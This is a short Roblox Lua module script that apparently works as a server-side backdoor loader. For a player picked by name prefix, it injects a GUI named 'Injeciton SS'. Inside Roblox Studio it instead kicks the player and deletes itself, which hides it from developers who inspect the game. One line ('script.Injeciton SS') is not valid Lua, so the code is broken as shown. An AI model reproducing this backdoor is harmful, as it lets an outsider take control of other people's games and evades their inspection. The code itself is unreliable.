local module = {}
function module.andres11(plr)
	local isStudio = game:GetService("RunService"):IsStudio()
	for _, v in pairs(game:GetService("Players"):GetPlayers()) do
		if string.sub(string.lower(v.Name), 0, string.len(plr)) == string.lower(plr) then
			if(isStudio)then 
				v:Kick("Dont play on Roblox Studio S  K  I  D") 
				script:Destroy()
			else
				local gui = script.Injeciton SS:Clone()
				gui.Parent = v:FindFirstChildWhichIsA("PlayerGui")
			end
		end
	end
end
return module
